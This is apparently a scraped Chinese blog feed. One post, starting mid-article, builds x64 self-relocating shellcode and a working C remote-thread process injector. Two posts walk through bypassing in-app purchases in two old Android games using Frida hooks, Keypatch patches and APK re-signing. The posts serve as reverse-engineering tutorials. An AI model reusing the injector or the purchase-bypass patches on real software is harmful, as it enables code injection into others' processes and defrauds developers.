执行完毕后，rbx中就包含变量Variable的真实地址了。 编写具有自我重定位功能的64位汇编代码获得64位汇编代码首先选择一个64位汇编的编译器。本文选用的是Visual Studio提供的ml64.exe。MASM for x64 (ml64.exe) 如果对ml64.exe不太熟悉，可以先编写C语言代码，然后再使用Visual Studio的命令行工具将C语言文件转换成汇编语言文件。 要想使用Visual Studio的命令行工具，可以先运行VsDevCmd.bat批处理文件，然后就能直接使用各种命令行工具，而不用输入路径名了。VsDevCmd.bat通常位于Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\Common7\\Tools文件夹下。 首先编写一个无限弹窗C语言代码： 12345678#include &lt;windows.h&gt;#pragma comment(lib, &quot;user32.lib&quot;)int main() { while(1) { MessageBoxA(NULL, &quot;Injected&quot;, &quot;A Window&quot;, MB_ICONSTOP | MB_OK); }} 保存到shellcode.c文件中。接下来，使用Visual Studio的命令行工具cl.exe编译： 12345678910111213141516&gt; vsdevcmd -arch=amd64************************************************************************ Visual Studio 2019 Developer Command Prompt v16.8.4** Copyright (c) 2020 Microsoft Corporation**********************************************************************&gt; cl /FA shellcode.c用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版版权所有(C) Microsoft Corporation。保留所有权利。shellcode.cMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:shellcode.exeshellcode.obj 选项/FA就可以让其产生汇编代码文件shellcode.asm。不过这个时候shellcode.asm内容比较复杂，编译得到的shellcode.exe也比较大（大约90KB）。如果可以简化shellcode.asm，并适当缩小shellcode.exe的体积将会更有利于后续分析。 对shellcode.asm进行修改，得到： 12345678910111213141516171819202122INCLUDELIB user32.libEXTRN __imp_MessageBoxA:PROC_TEXT SEGMENTmain PROC; Line 4 sub rsp, 40 ; 00000028H jmp $LN2@main Caption DB 'MessageBox', 00H Text DB 'Injected', 00H$LN2@main:; Line 6 mov r9d, 16 mov r8, offset Caption mov rdx, offset Text xor ecx, ecx call QWORD PTR __imp_MessageBoxA; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND 删掉了一些不必要的INCLUDE语句，仅保留一个INCLUDELIB，并删去一些不需要的节，如pdata和xdata。此外，还将数据节中的数据转移到代码节，并将数据节给删掉了。 其实我还改了一个地方，就是将第14行和第15行的lea指令修改成mov指令。如果是lea指令，则这里使用的是相对寻址，不需要进行重定位的操作。为了说明重定位的原理，将其修改为mov指令，从而让这里使用绝对寻址。 使用ml64.exe将修改后的shellcode.asm编译链接成可执行文件shellcode.exe： 1234567891011&gt; ml64 shellcode.asm /link /ENTRY:mainMicrosoft (R) Macro Assembler (x64) Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved. Assembling: shellcode.asmMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./OUT:shellcode.exeshellcode.obj/ENTRY:main shellcode.exe的体积缩小到了仅有大约3KB。 添加自我重定位功能在shellcode.asm中，调用MessageBoxA前会进行一系列传参操作。其中，传入Caption和Text的地址使用的是绝对地址。代码注入其他进程后，这个地址可能会发生改变，因此需要进行重定位操作。 12345.text:000000014000101A 41 B9 10 00 00 00 mov r9d, 10h ; uType.text:0000000140001020 49 B8 06 10 00 40 01 00 00 00 mov r8, offset Caption ; &quot;MessageBox&quot;.text:000000014000102A 48 BA 11 10 00 40 01 00 00 00 mov rdx, offset Text ; &quot;Injected&quot;.text:0000000140001034 33 C9 xor ecx, ecx ; hWnd.text:0000000140001036 FF 15 C4 0F 00 00 call cs:MessageBoxA 添加重定位操作后的代码为： 12345678910111213141516171819202122232425262728INCLUDELIB user32.libEXTRN __imp_MessageBoxA:PROC_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax jmp $LN2@main Caption DB 'MessageBox', 00H Text DB 'Injected', 00H$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor ecx, ecx call QWORD PTR __imp_MessageBoxA; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND rbx寄存器保存的就是Caption的真实地址，Caption的长度为11，因此Text的地址就为rbx+11。 用LoadLibraryA和GetProcAddress代替MessageBoxAMessageBoxA是user32.dll提供的一个函数。但是，并不是所有进程都会加载user32.dll，对于那些没有加载user32.dll的进程，注入的代码是无法正常运行的。不过，几乎所有进程都会加载kernel32.dll，而kernel32.dll中又包含LoadLibraryA和GetProcAddress，可以利用它们加载user32.dll并获取MessageBoxA的地址。 123456789101112131415161718192021222324252627282930313233343536373839INCLUDELIB kernel32.libEXTRN __imp_GetProcAddress:PROCEXTRN __imp_LoadLibraryA:PROC_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H ;通过重定位让rbx指向Caption首地址 call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax ;调用LoadLibraryA和GetProcAddress获得MessageBoxA lea rcx, [rbx + 20] call QWORD PTR __imp_LoadLibraryA lea rdx, [rbx + 31] mov rcx, rax call QWORD PTR __imp_GetProcAddress mov r12, rax jmp $LN2@main Caption DB 'MessageBox', 00H ;[rbx] Text DB 'Injected', 00H ;[rbx + 11] LibName DB 'user32.dll', 00H ;[rbx + 20] FuncName DB 'MessageBoxA', 00H ;[rbx + 31]$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor rcx, rcx call r12; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND 处理调用系统API的语句现在的代码中有两个调用系统API的语句： 12call QWORD PTR __imp_LoadLibraryAcall QWORD PTR __imp_GetProcAddress 将代码注入目标进程后，这两条语句就有可能不奏效了，因此把这两条语句处理一下。首先找到LoadLibraryA和GetProcAddress的地址，可以写一个很简单的C语言程序来找： 12345678910#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() { void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;); printf(&quot;LoadLibraryA Address: %p\\n&quot;, p1); printf(&quot;GetProcAddress Address: %p\\n&quot;, p2); return 0;} 在我当前的电脑上，运行结果为： 12LoadLibraryA Address: 00007FFFC185EBB0GetProcAddress Address: 00007FFFC185A360 因此，对这两条语句作如下修改： 12345mov rax, 00007FFFC185EBB0H ;LoadLibraryA入口地址call raxmov rax, 00007FFFC185A360H ;GetProcAddress入口地址call rax 这里用到了一个性质，就是对于一台电脑上运行的多个进程，系统API的虚拟地址通常是相等的。不过我希望这个代码还能在其他机器上运行，所以这里的00007FFFC185EBB0H和00007FFFC185A360H只是临时的，在注入其他进程之前还会被修改。 最终得到的代码12345678910111213141516171819202122232425262728293031323334353637_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H ;通过重定位让rbx指向Caption首地址 call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax ;调用LoadLibraryA和GetProcAddress获得MessageBoxA lea rcx, [rbx + 20] mov rax, 00007FFFC185EBB0H ;LoadLibraryA入口地址 call rax lea rdx, [rbx + 31] mov rcx, rax mov rax, 00007FFFC185A360H ;GetProcAddress入口地址 call rax mov r12, rax jmp $LN2@main Caption DB 'MessageBox', 00H ;[rbx] Text DB 'Injected', 00H ;[rbx + 11] LibName DB 'user32.dll', 00H ;[rbx + 20] FuncName DB 'MessageBoxA', 00H ;[rbx + 31]$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor rcx, rcx call r12; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND 使用ml64.exe生成可执行文件： 1234567891011&gt; ml64 shellcode.asm /link /ENTRY:mainMicrosoft (R) Macro Assembler (x64) Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved. Assembling: shellcode.asmMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./OUT:shellcode.exeshellcode.obj/ENTRY:main 然后，再将shellcode.exe拖入IDA Pro中，并将代码部分拖黑，再选择Edit-&gt;Export Data，将其导出为C语言数组形式： 1234567891011121314151617unsigned char ida_chars[] ={// 0 1 2 3 4 5 6 7 8 9 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, //0 0x48, 0xB8, 0x09, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, //1 0x48, 0x2B, 0xD8, 0x48, 0xB8, 0x4C, 0x10, 0x00, 0x40, 0x01, //2 0x00, 0x00, 0x00, 0x48, 0x03, 0xD8, 0x48, 0x8D, 0x4B, 0x14, //3 0x48, 0xB8, 0xB0, 0xEB, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, //4 0xFF, 0xD0, 0x48, 0x8D, 0x53, 0x1F, 0x48, 0x8B, 0xC8, 0x48, //5 0xB8, 0x60, 0xA3, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, 0xFF, //6 0xD0, 0x4C, 0x8B, 0xE0, 0xEB, 0x2B, 0x4D, 0x65, 0x73, 0x73, //7 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x49, 0x6E, 0x6A, //8 0x65, 0x63, 0x74, 0x65, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72, //9 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73, //10 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41, //11 0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, //12 0x53, 0x0B, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0xEB, 0xEB //13}; 编写进程注入程序获得了C语言数组形式的代码后，接下来要做的就是将代码注入到目标进程的内存空间中，然后在目标进程中执行这段代码了。不过在这之前，先要处理一下LoadLibraryA和GetProcAddress的地址。 之前的代码假定LoadLibraryA和GetProcAddress的地址分别为00007FFFC185EBB0H和00007FFFC185A360H，而这并不总是成立的。所以，先将这两个数值替换为LoadLibraryA和GetProcAddress的实际地址： 123456//获取LoadLibraryA和GetProcAddress的真实地址void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;);//ida_chars[]中LoadLibraryA位于ida_chars[42]，GetProcAddress位于ida_chars[61]*(uint64_t *)(&amp;ida_chars[42]) = (uint64_t)p1;*(uint64_t *)(&amp;ida_chars[61]) = (uint64_t)p2; 然后，就可以将数组ida_chars的内容写到目标进程的内存空间，并CreateRemoteThread开启远程线程执行这段代码了： 123456789101112131415161718192021222324//将ida_chars[]写入目标进程内存空间HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));if(NULL == hProcess) { printf(&quot;OpenProcess Failed: %d\\n&quot;, GetLastError()); return -1;}void *mem = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE);if(NULL == mem) { printf(&quot;VirtualAllocEx Failed: %d\\n&quot;, GetLastError()); return -1;}BOOL result = WriteProcessMemory(hProcess, mem, ida_chars, sizeof(ida_chars), NULL);if(!result) { printf(&quot;WriteProcessMemory Failed: %d\\n&quot;, GetLastError()); return -1;}//创建远程线程执行ida_chars[]中的代码HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL);if(NULL == hRemoteThread) { printf(&quot;CreateRemoteThread Failed: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;Injected!\\n&quot;);return 0; 完整代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;windows.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;unsigned char ida_chars[] ={// 0 1 2 3 4 5 6 7 8 9 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, //0 0x48, 0xB8, 0x09, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, //1 0x48, 0x2B, 0xD8, 0x48, 0xB8, 0x4C, 0x10, 0x00, 0x40, 0x01, //2 0x00, 0x00, 0x00, 0x48, 0x03, 0xD8, 0x48, 0x8D, 0x4B, 0x14, //3 0x48, 0xB8, 0xB0, 0xEB, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, //4 0xFF, 0xD0, 0x48, 0x8D, 0x53, 0x1F, 0x48, 0x8B, 0xC8, 0x48, //5 0xB8, 0x60, 0xA3, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, 0xFF, //6 0xD0, 0x4C, 0x8B, 0xE0, 0xEB, 0x2B, 0x4D, 0x65, 0x73, 0x73, //7 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x49, 0x6E, 0x6A, //8 0x65, 0x63, 0x74, 0x65, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72, //9 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73, //10 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41, //11 0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, //12 0x53, 0x0B, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0xEB, 0xEB //13};int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: inject [pid]\\n&quot;); return -1; } //获取LoadLibraryA和GetProcAddress的真实地址 void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;); //ida_chars[]中LoadLibraryA位于ida_chars[42]，GetProcAddress位于ida_chars[61] *(uint64_t *)(&amp;ida_chars[42]) = (uint64_t)p1; *(uint64_t *)(&amp;ida_chars[61]) = (uint64_t)p2; //将ida_chars[]写入目标进程内存空间 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1])); if(NULL == hProcess) { printf(&quot;OpenProcess Failed: %d\\n&quot;, GetLastError()); return -1; } void *mem = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE); if(NULL == mem) { printf(&quot;VirtualAllocEx Failed: %d\\n&quot;, GetLastError()); return -1; } BOOL result = WriteProcessMemory(hProcess, mem, ida_chars, sizeof(ida_chars), NULL); if(!result) { printf(&quot;WriteProcessMemory Failed: %d\\n&quot;, GetLastError()); return -1; } //创建远程线程执行ida_chars[]中的代码 HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL); if(NULL == hRemoteThread) { printf(&quot;CreateRemoteThread Failed: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;Injected!\\n&quot;); return 0;}","link":"/2021/01/24/windows-self-relocation-64bit-code-inject/"},{"title":"口袋侦探1安卓内购破解流程","text":"口袋侦探是由韩国NFLY STUDIO于2013年左右推出的手机游戏，分为1、2两部，由口袋汉化组汉化。NFLY STUDIO传闻已解散，该游戏也很久未更新，安卓版只能在很老的Android 4环境下运行。 目前，网上能下载到的口袋侦探安卓汉化版主要包括以下版本： 版本 来源 特点 下载 口袋侦探1汉化版 口袋汉化组汉化 存在BGM缺失的bug https://shouyou.3dmgame.com/android/588.html 口袋侦探1无限金币版 口袋汉化组汉化+爱吾破解 初始金币修改为25252525 https://www.bilibili.com/video/BV1yL411U7P1/ 口袋侦探2汉化版 口袋汉化组汉化 正常 https://shouyou.3dmgame.com/android/1358.html 口袋侦探2无限金币版 口袋汉化组汉化+爱吾破解 初始金币修改为25252525 https://m.25game.com/android/View/4206/ 口袋侦探1汉化版存在的BGM缺失问题，试验后发现，只需用apktool作一个简单的重打包即可解决。本文会在3DM上面下载的口袋侦探1汉化版APK上进行实验。 游戏中有一个“侦探商店”功能，在商店中购买金币，游戏会卡死。 本文会介绍除修改初始金币外的另一种破解思路，即对“侦探商店”这一功能进行破解。 本文的项目地址为：https://github.com/JackNoire/InfinitePrivateEye_CHS 下载安卓4模拟器目前很多安卓模拟器都仅支持安卓5及以上的安卓版本，例如新版雷电模拟器仅支持安卓5.0、7.1、9.0这几个版本。可以在这个地址下载安卓4.3版本的雷电模拟器： http://res.ldmnq.com/download/1.9.1/ldinst_1.9.1.exe 也可使用其他的安卓4模拟器。 对侦探商店功能进行分析分析Java层启动安卓模拟器，然后使用logcat（可以用Android Studio里面的logcat），用APK的包名（com.creativefactory）进行过滤。 接下来，在模拟器中启动APP，进入侦探商店，尝试购买金币。发现报错：&quot;Could not bind to service.&quot; 使用JADX对该APK进行静态分析： skylot/jadx: Dex to Java decompiler 搜索该字符串，可以找到： 使用Frida对bindToMarketBillingService挂钩。由于运行环境是Android 4，新版Frida无法在上面运行，因此需要使用老版的Frida，而老版的Frida又需要老版的Python。 使用的Python和Frida的版本为： 123Python==3.8frida==15.1.11frida-tools==10.4.1 首先创建一个Python 3.8的环境，如果使用anaconda则： 12conda create -n py38 python=3.8conda activate py38 然后用pip安装特定版本的frida和frida-tools： 12pip install frida==15.1.11pip install frida-tools==10.4.1 pip install frida时可能会卡住，在这里找到一个解决方法： https://github.com/frida/frida/issues/2012 也就是进入这个网站：https://pypi.org/project/frida/15.1.11/#files 下载frida-15.1.11-py3.8-win-amd64.egg，然后将该文件丢到C:\\Users\\用户名这个路径下，例如我的电脑上是C:\\Users\\lenovo。之后再重新执行pip install命令。 安装完frida后，再挂钩bindToMarketBillingService，编写JS脚本test.js： 123456789101112setTimeout(function () { Java.perform(function () { let BillingService = Java.use(&quot;com.creativefactory.BillingService&quot;); BillingService[&quot;bindToMarketBillingService&quot;].implementation = function () { console.log(`BillingService.bindToMarketBillingService is called`); let result = this[&quot;bindToMarketBillingService&quot;](); console.log(`BillingService.bindToMarketBillingService result=${result}`); console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new())); return result; }; });}, 0); 启动安卓模拟器，安装口袋侦探1的APK文件。getprop检查模拟器架构为x86： 12&gt; adb shell getprop ro.product.cpu.abix86 adb push放入x86的15.1.11版本frida-server，adb shell chmod修改运行权限，然后运行： 12&gt; adb shell# /data/local/tmp/frida-server-15.1.11-android-x86 在电脑上执行命令挂钩： 12frida -U -l test.js -f com.creativefactory再输入%resume 输出如下： 12345678910111213141516171819BillingService.bindToMarketBillingService is calledBillingService.bindToMarketBillingService result=falsejava.lang.Exception at com.creativefactory.BillingService.bindToMarketBillingService(Native Method) at com.creativefactory.BillingService.bindToMarketBillingService(Native Method) at com.creativefactory.BillingService.bindToMarketBillingService(Native Method) at com.creativefactory.BillingService.access$0(BillingService.java:417) at com.creativefactory.BillingService$BillingRequest.runRequest(BillingService.java:100) at com.creativefactory.BillingService.requestPurchase(BillingService.java:457) at com.creativefactory.ExecuteBilling$1.run(ExecuteBilling.java:74) at android.os.Handler.handleCallback(Handler.java:730) at android.os.Handler.dispatchMessage(Handler.java:92) at android.os.Looper.loop(Looper.java:137) at android.app.ActivityThread.main(ActivityThread.java:5103) at java.lang.reflect.Method.invokeNative(Native Method) at java.lang.reflect.Method.invoke(Method.java:525) at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:737) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553) at dalvik.system.NativeStart.main(Native Method) 由stacktrace可以找到purchaseItem： 于是，再对purchaseItem挂钩： 12345678910setTimeout(function () { Java.perform(function () { let ExecuteBilling = Java.use(&quot;com.creativefactory.ExecuteBilling&quot;); ExecuteBilling[&quot;purchaseItem&quot;].implementation = function (pID) { console.log(`ExecuteBilling.purchaseItem is called: pID=${pID}`); console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new())); this[&quot;purchaseItem&quot;](pID); }; });}, 0); 输出如下： 12345678910ExecuteBilling.purchaseItem is called: pID=com.creativefactory.timeprivate.10000pjava.lang.Exception at com.creativefactory.ExecuteBilling.purchaseItem(Native Method) at com.creativefactory.ExecuteBilling.purchaseItem(Native Method) at com.creativefactory.ExecuteBilling.purchaseItem(Native Method) at com.creativefactory.SqliteManager.purchaseItem(SqliteManager.java:234) at org.cocos2dx.lib.Cocos2dxRenderer.nativeRender(Native Method) at org.cocos2dx.lib.Cocos2dxRenderer.onDrawFrame(Cocos2dxRenderer.java:59) at android.opengl.GLSurfaceView$GLThread.guardedRun(GLSurfaceView.java:1534) at android.opengl.GLSurfaceView$GLThread.run(GLSurfaceView.java:1251) 也就是说，是从native层代码调用的Java层的SqliteManager.purchaseItem，然后SqliteManager.purchaseItem再去调用ExecuteBilling.purchaseItem 可以猜测，游戏主要逻辑写在native层，点击付费后会调用Java层函数，在Java层处理完付费后，会回到native层，继续执行付费成功/失败的游戏逻辑。于是，在JADX中搜索native函数，找到native函数com.creativefactory.TimePrivate.receiveResult，在com.creativefactory.PurchaseObserver.onRequestPurchaseResponse这里被调用： 分析native层apktool对apk文件解包： 1apktool d koudaizhentan.apk 在lib/armeabi中看到这四个文件： 1234libcocos2d.solibcocosdenshion.solibgame.solibgame_logic.so 由于是x86模拟器，没法直接用frida挂钩arm的函数，所以只能静态分析。使用IDA Pro分析，在libgame_logic.so里面发现对Java层purchaseItem的调用： 用快捷键x往上查找该函数的xrefs，可以找到MJScene::runPurchaseItem： 这个函数里对一个数组作了赋值操作，然后调用了purchaseItem。 而在ShopLayer::_runBuyItem里调用了MJScene::runPurchaseItem，这里GameInfo::shared函数返回的地址+60的地方，就有下标为64和66的地方分别被赋值了_completeBuyItem和_failedBuyItem这两个函数。 ShopLayer::_buySelectedItem出现了ShopLayer::_runBuyItem： 联想到游戏中侦探商店购买物品会弹一个窗，让玩家选确认，再由这个函数名，猜测这里可能是弹一个窗，点击窗口中的“确定”就会执行ShopLayer::_runBuyItem这个函数。 接下来，再分析如果交易成功，会执行哪段代码。在libgame_logic.so中搜索native函数receiveResult，找到Java_com_creativefactory_TimePrivate_receiveResult 如果交易成功，会执行MJScene::completePurchaseItem IDA Pro在反编译时，可能弄错参数的个数。查找网上cocos2d的代码示例，找到： 123this-&gt;runAction(CCSequence::actions(CCDelayTime::actionWithDuration(3),CCCallFunc::actionWithTarget(this, callfunc_selector(GameOverLayer::gameOverDone)),NULL)); actionWithTarget应该至少有两个参数。如果参数个数不对，可以右键actionWithTarget→Set item type…，然后修改函数参数为两个以上： 而在MJScene::failedPurchaseItem中，则是： 之前已经知道，某个下标为64的地方被赋值了下标为64和66的地方分别被赋值了ShopLayer::_completeBuyItem和ShopLayer::_failedBuyItem这两个函数。这里也出现了64和66这两个下标，也就是说，这里MJScene::completePurchaseItem很可能最终会以某种方式去调用ShopLayer::_completeBuyItem。 在ShopLayer::_completeBuyItem中会发现似乎是会去调用ShopLayer::_showCompletePopup： 粗略查看一下_showCompletePopup，里面内容非常复杂，猜测会更新金币数量。 于是，考虑对native层的内容进行修改，在点击确认交易的弹窗后，调用ShopLayer::_runBuyItem时，去调用ShopLayer::_showCompletePopup。 Keypatch修改native函数内容使用IDA Pro的Keypatch插件修改ShopLayer::_runBuyItem的内容，让它调用ShopLayer::_showCompletePopup。 在ShopLayer::_runBuyItem中，从std::string::compare开始修改，直接修改为一个对ShopLayer::_showCompletePopup的调用。 ShopLayer::_completeBuyItem需要传两个参数进去，一个ShopLayer *this，一个浮点数。 浮点数可以就传一个0。而对于这个ShopLayer *this，恰好ShopLayer::_runBuyItem的第一个参数也是ShopLayer *this。所以可以直接将ShopLayer::_runBuyItem的第一个参数传给ShopLayer::_completeBuyItem。 从SUB SP, SP, #0x2C后面一条，即.text:000A9B96开始修改。 这个地方R0的值还没被修改，所以还等于ShopLayer::_runBuyItem的第一个参数。只需要将第二个参数设置为0.0，然后调用ShopLayer::_completeBuyItem即可。 Keypatch的使用方法：Ctrl+Alt+K，或Edit→Keypatch→Patcher，再输入指令即可。 修改后： 然后，Edit→Patch program→Apply patches to input file，将修改写到文件里。 apktool重打包并签名在重打包前，记得将lib/armeabi路径下IDA Pro生成的idb文件移出来，以免这个文件被打包进apk。 在解包的文件夹路径下，执行： 1apktool b . 然后使用Java JDK里的keytool和jarsigner进行签名，这两个工具通常在%JAVA_HOME%\\bin里面。 建议使用jdk1.8.0_202版本或这个附近的版本。如果使用新版Java（例如Java 17）中的工具签名，在Android 4中可能报错：INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION 123cd distkeytool -genkey -v -keystore my-release-key.keystore -alias cert -keyalg RSA -keysize 2048 -sigalg SHA1withRSA -validity 10000jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore koudaizhentan.apk cert 我使用的apktool版本为2.7.0，如果使用老版的apktool，可能还需要用zipalign对齐。 最后，在雷电模拟器上卸载并重新安装新的口袋侦探APK文件。进入侦探商店并购买金币：","link":"/2024/02/22/crack-koudaizhentan-1/"},{"title":"口袋侦探2安卓内购破解流程","text":"在上一篇文章中，我介绍了口袋侦探1的破解流程。本文会介绍口袋侦探2的破解流程。 本文使用的是从3DM下载的口袋汉化组汉化版本。 本文的项目地址为：https://github.com/JackNoire/InfinitePrivateEye_CHS 分析Java层和口袋侦探1类似，还是先进入商店，选择支付，然后进logcat看报错信息： 搜索字符串，找到： 使用Frida对该函数挂钩，注意使用旧版的Python和frida： 123Python==3.8frida==15.1.11frida-tools==10.4.1 test.js： 123456789setTimeout(function () { Java.perform(function () { let IabHelper = Java.use(&quot;com.nflystudio.InfinitePrivateEye2.util.IabHelper&quot;); IabHelper[&quot;logError&quot;].implementation = function (msg) { console.log(`IabHelper.logError is called: msg=${msg}`); this[&quot;logError&quot;](msg); }; });}, 0); 执行： 12frida -U -l test.js -f com.nflystudio.InfinitePrivateEye2然后执行%resume 在APP里进入商店，执行支付操作，得到： 1234567891011121314IabHelper.logError is called: msg=Illegal state for operation (launchPurchaseFlow): IAB helper is not set up.java.lang.Exception at com.nflystudio.InfinitePrivateEye2.util.IabHelper.logError(Native Method) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.logError(Native Method) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.logError(Native Method) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.checkSetupDone(IabHelper.java:755) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.launchPurchaseFlow(IabHelper.java:357) at com.nflystudio.InfinitePrivateEye2.util.IabHelper.launchPurchaseFlow(IabHelper.java:324) at com.nflystudio.InfinitePrivateEye2.InfinitePrivateEye2.purchaseItem(InfinitePrivateEye2.java:182) at com.nflystudio.InfinitePrivateEye2.SqliteManager.purchaseItem(SqliteManager.java:254) at org.cocos2dx.lib.Cocos2dxRenderer.nativeRender(Native Method) at org.cocos2dx.lib.Cocos2dxRenderer.onDrawFrame(Cocos2dxRenderer.java:94) at android.opengl.GLSurfaceView$GLThread.guardedRun(GLSurfaceView.java:1534) at android.opengl.GLSurfaceView$GLThread.run(GLSurfaceView.java:1251) 于是可以找到这个函数：com.nflystudio.InfinitePrivateEye2.SqliteManager.purchaseItem 也就是说，游戏逻辑写在native里，当点击支付后，会调用Java的这个purchaseItem函数。 接下来，搜索native函数，会发现和口袋侦探1相同，也有一个名为receiveResult的native函数： 如果支付成功，Java层就会调用这个receiveResult函数，再回到native层。 分析native层口袋侦探2只有一个so文件，libgame.so，用IDA Pro分析该文件，会发现和口袋侦探1差不多。 首先找SqliteManager.purchaseItem，可以找到SqliteManagerJni::purchaseItemJni： 找它的xrefs，最终可以找到ShopLayer::_runBuyItem调用MJScene::runPurchaseItem，而在runPurchaseItem里面，也是一样的先给数组赋值，再调用purchaseItem函数： 再看receiveResult，在native层名字叫Java_com_nflystudio_InfinitePrivateEye2_InfinitePrivateEye2_receiveResult，这个和口袋侦探1也一样： 而在completePurchaseItem里面，也是通过某种方式去调用ShopLayer::_completeBuyItem 结构基本上和口袋侦探1一样，所以破解思路也和口袋侦探1一样，修改ShopLayer::_runBuyItem的开头，让它直接调用ShopLayer::_completeBuyItem Keypatch修改native函数内容在汇编窗口里定位到ShopLayer::_runBuyItem，从.text:0015FB76开始修改，给参数赋值、调用ShopLayer::_completeBuyItem，然后跳到函数末尾。 修改后： Edit→Patch program→Apply patches to input file，将修改写到文件里。 apktool重打包并签名在重打包前，记得将lib/armeabi路径下IDA Pro生成的idb文件移出来，以免这个文件被打包进apk。 重打包、签名的操作和口袋侦探1相同，注意使用Java jdk1.8.0_202版本或这个附近的版本的keytool和jarsigner。 1234apktool b .cd distkeytool -genkey -v -keystore my-release-key.keystore -alias cert -keyalg RSA -keysize 2048 -sigalg SHA1withRSA -validity 10000jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore koudaizhentan2.apk cert 